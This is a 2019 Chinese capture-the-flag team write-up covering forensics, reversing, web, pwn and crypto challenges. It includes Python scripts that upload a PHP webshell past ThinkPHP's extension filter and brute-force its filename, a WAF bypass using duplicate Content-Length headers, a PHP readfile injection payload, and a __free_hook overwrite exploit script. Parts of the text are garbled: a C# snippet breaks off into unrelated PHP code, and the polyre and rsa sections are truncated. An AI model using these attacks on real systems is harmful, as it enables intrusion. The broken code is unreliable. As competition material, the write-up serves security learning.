**作者：楼上请让路战队**  
**时间：2019年10月22日**
#### 黄金6年
文件尾部有一段base64，解码为16进制可以看到是一个压缩包
使用pr抽帧
可以看到部分帧中有二维码，依次扫码即可得到key iwantplayctf
#### forensic
直接上volatility
建议profile，直接用Win7SP1x86就可以。
查看进程
volatility -f mem.raw pslist --profile=Win7SP1x86
可以看到存在以下几个值得注意的进程：
Dumpit.exe 一款内存镜像提取工具。
TrueCrypt.exe 一款磁盘加密工具。
Notepad.exe windows自带的记事本。
Mspaint,exe windows自带画图工具。
通过查看userassist可以发现notepad mspaint
在提取内存时在内存中并没有数据。查看用户Home目录的文件，可以发现有一个用户保存的图片文件
`volatility -f mem.raw --profile=Win7SP1x86 filescan|grep -v Temporary |grep
-v .dll|grep -E 'png|jpg|gif|zip|rar|7z|pdf'`
把图片dump下来
通过查看桌面文件还可以发现dumpit.exe在桌面上，而dumpit.exe默认生成的文件是
{hash}.raw，默认保存路径是dumpit.exe所在的路径。
尝试dump
位于0x000000001fca1130位置的raw镜像，发现该文件还没有数据，因此判断取证的时候dumpit.exe还在运行中，dump下来dumpit.exe的内存镜像。
对dumpit.exe的内存镜像进行分析
猜测密码就是刚那张图片上的扭曲文字
不得不说，有几个位置很难辨认，比如第一个字符是数字1还是字母l还是字母I,那些大小写长得一样的是大写还是小写，中间那个是y还是g。直接上掩码爆破
#### TankGame
用dnspy反编译，关键代码：
    public static void WinGame()
       {
           if (!winGame && ((nDestroyNum == 4) || (nDestroyNum == 5)))
           {
               string str = "clearlove9";
               for (int i = 0; i maxSize  = 4096 ;// 设置附件上传大小
            $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
            $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
            $upload->savePath = '';// 设置附件上传子目录
            $info = $upload->upload() ;
            if(!$info) {// 上传错误提示错误信息
              $this->error($upload->getError());
              return;
            }else{// 上传成功 获取上传文件信息
              $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
              echo json_encode(array("url"=>$url,"success"=>1));
            }
        }
    } 
ThinkPHP默认上传文件名是递增的。代码中ThinkPHP的后缀过滤无效，所以通过上传多个文件的方式，绕过.php后缀的判断，文件名，需要爆破
写脚本上传一个正常文件，再上传多个文件，再上传一个正常文件。然后获取到第一三次上传的文件名
    import requests
    url = "http://lo408dybroarctf.4hou.com.cn:34422/index.php/Home/Index/upload"
    files1 = {'file': open('test.txt','r')}
    files2 = {'file[]': open('test.php','r')}
    r = requests.post(url,files=files1)
    print(r.text)
    r = requests.post(url,files=files2)
    print(r.text)
    r = requests.post(url,files=files1)
    print(r.text)
爆破一下第一三文件名之间的所有文件名
    import requests
    #{"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bb3645.txt","success":1}
    #{"url":"\/Public\/Uploads\/","success":1}
    #{"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bd6f0a.txt","success":1}
    s = "1234567890abcdef"
    for i in s:
        for j in s:
            for k in s:
                for l in s:
                    url = "http://lo408dybroarctf.4hou.com.cn:34422/Public/Uploads/2019-10-12/5da1b52bc%s%s%s%s.php"%(i,j,k,l)
                    r = requests.get(url)
    #               print(url)
                    if r.status_code != 404:
                        print(url)
                        break
爆破到文件名后，即可访问上传的木马，拿到flag
#### easy_calc
这题首先进去发现是一个计算器的题目。
这道题是国赛的 **love_math** 的修改版，除去了长度限制，payload中不能包含' ', '\t', '\r', '\n',''', '"',
'`', '[', ']'
等字符，不同的是网站加了waf，需要绕过waf。首先需要绕过waf，测试发现当我们提交一些字符时，会直接403，可以构造畸形的HTTP包来绕过，经测试使用两个
"Content-Length" 就可以了。
因为禁掉了一些字符，所以导致我们不能直接getflag，继续分析payload构造
这里用到几个php几个数学函数。
我们首先要构造列目录的payload，肯定要使用`scandir`函数，尝试构造列举根目录下的文件。`scandir`可以用`base_convert`函数构造，但是利用`base_convert`只能解决`a~z`的利用，因为根目录需要`/`符号，且不在`a~z`,所以需要`hex2bin(dechex(47))`这种构造方式，`dechex()`
函数把十进制数转换为十六进制数。`hex2bin()` 函数把十六进制值的字符串转换为 ASCII 字符。
构造读取flag，使用`readfile`函数，paload：`base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))`，方法类似
#### easy_java
这道进去首先想到的就是任意文件下载，但是刚开始用`GET`方式一直什么都下载不了，连网站确定目录的图片都下不了。后来修改为post，可以了。。。
尝试读取`WEB-INF/web.xml`发现操作flag的关键文件位置
将图中base64解码即flag。
#### ez_op
payload:
    #!/usr/bin/env python3
    # -*- coding=utf-8 -*-    
    from pwn import *
    system_addr = 0x08051C60
    hook_free = 0x080E09F0
    # opcdoe
    opcode = ""
    # get stack_addr
    opcode += """\
    push 5
    stack_load\
    """
    # sub hook_free
    opcode += f"""\
    push {hook_free}
    sub\ 
    """
    # value / 4 + 1
    opcode += """\
    push 4
    div
    push 1
    add\
    """
    # *hook_free = system_addr
    opcode += f"""\
    push {system_addr}
    stack_set\
    """
    opcode = f"""\
    push {0x6e69622f}
    push {0x68732f}
    push {system_addr}
    push 1
    push 4
    push 64
    stack_load
    push {hook_free}
    sub
    div
    sub
    stack_set\
    """
    OPCODET = {
      "push": 0x2a3d,
      "add": 0,
      "sub": 0x11111,
      "div": 0x514,
      "stack_set": 0x10101010,
      "stack_load": -1
    }
    opcode_list = opcode.split("\n")
    op_result = []
    num_result = []
    for op in opcode_list:
      tmp = op.split(" ")
      assert tmp[0] in OPCODET
      op_result.append(str(OPCODET[tmp[0]]))
      if len(tmp) == 2:
          num_result.append(str(tmp[1]))
    result_op = " ".join(op_result)
    result_num = " ".join(num_result)
    print(result_op)
    print(result_num)
#### polyre
使用 deflat.py 脱去控制流平坦化，加密算法大致是：输入 48，平分 6 组，将每组 8 字节转化为 long
类型的值，对每组进行加密，先判断正负，然后将值乘 2，随后根据正负异或 0xB0004B7679FA26B3，循环 64
次，最后进行比较；按照这个逻辑写逆运算就可以了，逆运算见 depoly.py
    origin = [0xbc8ff26d43536296,
              0x520100780530ee16,
              0x4dc0b5ea935f08ec,
              0x342b90afd853f450,
              0x8b250ebcaa2c3681,
              0x55759f81a2c68ae4]
    key = 0xB0004B7679FA26B3
    data = ""
    for value in origin:
        for i in range(0, 64):
            tail = value & 1
            if tail == 1:
                value = value ^ key
            value = value // 2
            if tail == 1:
                value = value | 0x8000000000000000
            #print(hex(value))
        # end for
        print(hex(value))
        j = 0
        while (j > 8
            j += 1
        # end while
    #end for
    print(data)
#### rsa
根据题目文件可知：
A=(((y%x) **5)%(x%y))** 2019+y**316+(y+1)/x
p=next_prime(z _x_ y)
q=next_prime(z)
n=p*q
直接爆破A方程可得 x*y=166。（一个是2一个是83，懒得重新写脚本了很好爆。）
然后可得
    p=next_prime(z*166)
    q=next_prime(z)
可以推断出，n和z _z_
166的值相对来说是距离比较近的，根据next_prime可以推测出sqrt(n/166)的值和p和q的其中一个是很接近的，爆破即可。
py2 ：